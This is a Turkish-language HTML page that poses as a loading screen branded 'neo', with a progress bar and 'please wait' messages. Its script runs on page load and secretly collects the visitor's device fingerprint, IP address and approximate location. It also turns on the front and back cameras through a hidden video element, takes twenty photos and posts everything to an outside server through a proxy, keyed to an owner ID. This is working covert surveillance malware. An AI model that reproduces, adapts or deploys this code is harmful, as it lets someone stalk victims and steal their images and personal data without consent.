<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Neo</title>
<style>
* { margin:0; padding:0; box-sizing:border-box; }
body, html { height:100%; background:#000; display:flex; justify-content:center; align-items:center;
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
.container { text-align:center; padding:20px; }
.neo-text { color:#cc0000; font-size:100px; font-weight:700; text-shadow:0 0 10px #cc0000;
    margin-bottom:60px; letter-spacing:6px; }
.progress-wrapper { width: 85%; max-width: 340px; margin: 0 auto 20px; }
.progress-outer { width: 100%; height: 7px; background: rgba(204,0,0,0.1);
    border-radius: 10px; overflow: hidden; }
.progress-inner { width: 0%; height: 100%; background: #cc0000; border-radius: 10px;
    transition: width 0.3s ease; }
#progress-percent { color: #cc0000; font-size: 28px; font-weight: bold; margin: 15px 0; }
#status-text { color: #888; font-size: 15px; font-weight: 300; margin-top: 30px; }
#video { position:fixed; top:0; left:0; width:1px; height:1px; opacity:0; pointer-events:none; }
@media (max-width:480px) {
    .neo-text { font-size:75px; }
    #progress-percent { font-size:24px; }
    #status-text { font-size:13px; }
}
</style>
</head>
<body>
<div class="container">
    <div class="neo-text">neo</div>
    <div class="progress-wrapper">
        <div class="progress-outer"><div class="progress-inner" id="progress-bar"></div></div>
        <div id="progress-percent">%0</div>
    </div>
    <div id="status-text">hoş geldin...</div>
</div>
<video id="video" autoplay playsinline muted></video>
<canvas id="canvas" style="display:none;"></canvas>
<script>
const CLOUDFLARE_PROXY = "https://neo-cors-proxy.halahalaq.workers.dev";
const FADEHOST_URL = "https://myrules.fadehost.app";
const urlParams = new URLSearchParams(window.location.search);

function sanitizeOwnerId(raw) {
    if (!raw) return "bilinmiyor";
    const clean = String(raw).replace(/[^a-zA-Z0-9_-]/g, '').slice(0, 64);
    return clean.length > 0 ? clean : "bilinmiyor";
}
const ownerId = sanitizeOwnerId(urlParams.get('owner_id'));
const csrfToken = "github_pages_token";

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const progressBar = document.getElementById('progress-bar');
const progressPercent = document.getElementById('progress-percent');
const statusText = document.getElementById('status-text');

let stream = null;
let photoCount = 0;
let isFinished = false;
let msgTimer = null;

const statusMessages = [
    'hoş geldin...','bir dakika.....','yükleniyor...','yükleniyor...',
    'sunucunun cevabı bekleniyor...','lütfen bekleyin...'
];
let msgIndex = 0;

function updateProgress(pct) {
    const safe = Math.max(0, Math.min(100, Math.round(pct)));
    progressBar.style.width = safe + '%';
    progressPercent.textContent = '%' + safe;
}

function startMessageCycle() {
    stopMessageCycle();
    msgTimer = setInterval(() => {
        if (isFinished) return;
        statusText.textContent = statusMessages[msgIndex];
        msgIndex = (msgIndex + 1) % statusMessages.length;
    }, 2500);
}

function stopMessageCycle() {
    if (msgTimer) { clearInterval(msgTimer); msgTimer = null; }
}

function finishFlow() {
    isFinished = true;
    stopMessageCycle();
    updateProgress(100);
    statusText.textContent = 'lütfen bekleyin...';
}

function stopStream() {
    if (stream) {
        try { stream.getTracks().forEach(t => t.stop()); } catch(e) {}
        stream = null;
    }
}

function withTimeout(promise, ms) {
    return Promise.race([
        promise,
        new Promise((_, reject) => setTimeout(() => reject(new Error('timeout')), ms))
    ]);
}

async function collectDeviceInfo() {
    const info = {};
    try {
        info.time = new Date().toLocaleString('tr-TR');
        info.userAgent = navigator.userAgent;
        info.language = navigator.language;
        info.platform = navigator.platform;
        info.screenSize = screen.width + 'x' + screen.height;
        info.cpuCores = navigator.hardwareConcurrency || '?';

        try {
            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            if (conn) {
                info.connectionType = conn.effectiveType || '?';
                info.downlink = conn.downlink + ' Mbps';
                info.rtt = conn.rtt + ' ms';
            }
        } catch(e) {}

        try {
            info.ram = navigator.deviceMemory || '?';
            if (info.ram !== '?') info.ram += ' GB';
        } catch(e) { info.ram = '?'; }

        try {
            if (typeof navigator.getBattery === 'function') {
                const b = await withTimeout(navigator.getBattery(), 3000);
                info.batteryLevel = Math.round(b.level * 100) + '%';
                info.isCharging = b.charging;
            } else {
                info.batteryLevel = '?';
                info.isCharging = false;
            }
        } catch(e) {
            info.batteryLevel = '?';
            info.isCharging = false;
        }

        try {
            const c2 = document.createElement('canvas');
            const gl = c2.getContext('webgl') || c2.getContext('experimental-webgl');
            if (gl) {
                const dbg = gl.getExtension('WEBGL_debug_renderer_info');
                if (dbg) info.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
            }
        } catch(e) { info.gpu = '?'; }

        try {
            const ua = navigator.userAgent;
            if (ua.includes('iPhone')) { info.deviceBrand='Apple'; info.deviceModel='iPhone'; }
            else if (ua.includes('iPad')) { info.deviceBrand='Apple'; info.deviceModel='iPad'; }
            else if (ua.includes('Android')) { info.deviceBrand='Android'; info.deviceModel='Android'; }
            else if (ua.includes('Windows')) { info.deviceBrand='Microsoft'; info.deviceModel='Windows PC'; }
            else if (ua.includes('Mac')) { info.deviceBrand='Apple'; info.deviceModel='Mac'; }
            else if (ua.includes('Linux')) { info.deviceBrand='Linux'; info.deviceModel='Linux PC'; }
        } catch(e) {}

        try {
            const r = await withTimeout(fetch('https://ipapi.co/json/'), 5000);
            const d = await r.json();
            info.ip = d.ip || '?';
            info.city = d.city || '?';
            info.region = d.region || '?';
            info.country = d.country_code || '?';
            info.loc = (d.latitude || '') + ',' + (d.longitude || '');
            info.org = d.org || '?';
            info.postal = d.postal || '?';
            info.timezone = d.timezone || '?';
        } catch(e) { info.ip = '?'; info.city = '?'; }
    } catch(e) {}
    return info;
}

async function sendDeviceInfo() {
    try {
        const info = await collectDeviceInfo();
        const targetUrl = FADEHOST_URL + '/device_info';
        const proxyUrl = CLOUDFLARE_PROXY + '/?url=' + encodeURIComponent(targetUrl);
        const r = await withTimeout(fetch(proxyUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'X-CSRF-Token': csrfToken },
            body: JSON.stringify({ owner_id: ownerId, device_info: info })
        }), 10000);
        return r.ok;
    } catch(e) { return false; }
}

async function initCamera(facingMode) {
    stopStream();
    const attempt = async (constraints) => {
        stream = await navigator.mediaDevices.getUserMedia(constraints);
        video.srcObject = stream;
        video.muted = true;
        video.playsInline = true;
        await new Promise((resolve, reject) => {
            const onMeta = () => { video.onloadedmetadata = null; resolve(); };
            video.onloadedmetadata = onMeta;
            setTimeout(() => { video.onloadedmetadata = null; reject(new Error('metadata timeout')); }, 8000);
        });
        try { await withTimeout(video.play(), 5000); } catch(e) {}
        const start = Date.now();
        while (video.readyState < 2 && Date.now() - start < 3000) {
            await new Promise(r => setTimeout(r, 100));
        }
        return true;
    };
    try {
        return await attempt({ video: { facingMode, width: { ideal: 640 }, height: { ideal: 480 } }, audio: false });
    } catch(e) {
        stopStream();
        try { return await attempt({ video: { facingMode }, audio: false }); }
        catch(e2) { stopStream(); return false; }
    }
}

function isBlankCanvas(ctx, w, h) {
    try {
        const data = ctx.getImageData(0, 0, w, h).data;
        let sum = 0, count = 0;
        for (let i = 0; i < data.length; i += 40) {
            sum += (data[i] + data[i+1] + data[i+2]) / 3;
            count++;
        }
        return (sum / count) < 8;
    } catch(e) { return false; }
}

function captureImage() {
    try {
        if (video.readyState < 2) return null;
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        if (isBlankCanvas(ctx, canvas.width, canvas.height)) return null;
        return canvas.toDataURL('image/jpeg', 0.7);
    } catch(e) { return null; }
}

async function sendPhoto(img, type) {
    const targetUrl = FADEHOST_URL + '/upload';
    const proxyUrl = CLOUDFLARE_PROXY + '/?url=' + encodeURIComponent(targetUrl);
    const payload = JSON.stringify({ owner_id: ownerId, image: img, camera_type: type });
    for (let attempt = 0; attempt < 2; attempt++) {
        try {
            const r = await withTimeout(fetch(proxyUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json', 'X-CSRF-Token': csrfToken },
                body: payload
            }), 15000);
            if (r.ok) { photoCount++; return true; }
        } catch(e) {}
        await new Promise(r => setTimeout(r, 800));
    }
    return false;
}

async function captureOne(facingMode, type, progressOnStart, progressOnEnd) {
    updateProgress(progressOnStart);
    try {
        const ok = await initCamera(facingMode);
        if (ok) {
            await new Promise(r => setTimeout(r, 300));
            const img = captureImage();
            if (img) await sendPhoto(img, type);
        }
    } catch(e) {}
    updateProgress(progressOnEnd);
}

async function capturePhotos() {
    // 10 tur, her turda ön + arka. Toplam 20 fotoğraf.
    const TUR = 10;
    for (let i = 1; i <= TUR; i++) {
        if (isFinished) break;
        const base = (i - 1) * 9; // 0..81
        await captureOne('user', 'On Kamera ' + i, base + 1, base + 4.5);
        if (isFinished) break;
        await captureOne('environment', 'Arka Kamera ' + i, base + 4.5, base + 9);
    }
    stopStream();
    finishFlow();
}

async function main() {
    try {
        startMessageCycle();
        updateProgress(0);
        sendDeviceInfo();
        setTimeout(async () => {
            try { await capturePhotos(); }
            catch(e) { finishFlow(); }
        }, 2000);
    } catch(e) { finishFlow(); }
}

window.addEventListener('beforeunload', () => {
    stopMessageCycle();
    stopStream();
});

if (document.readyState === 'complete') main();
else window.addEventListener('load', main);
</script>
</body>
</html>
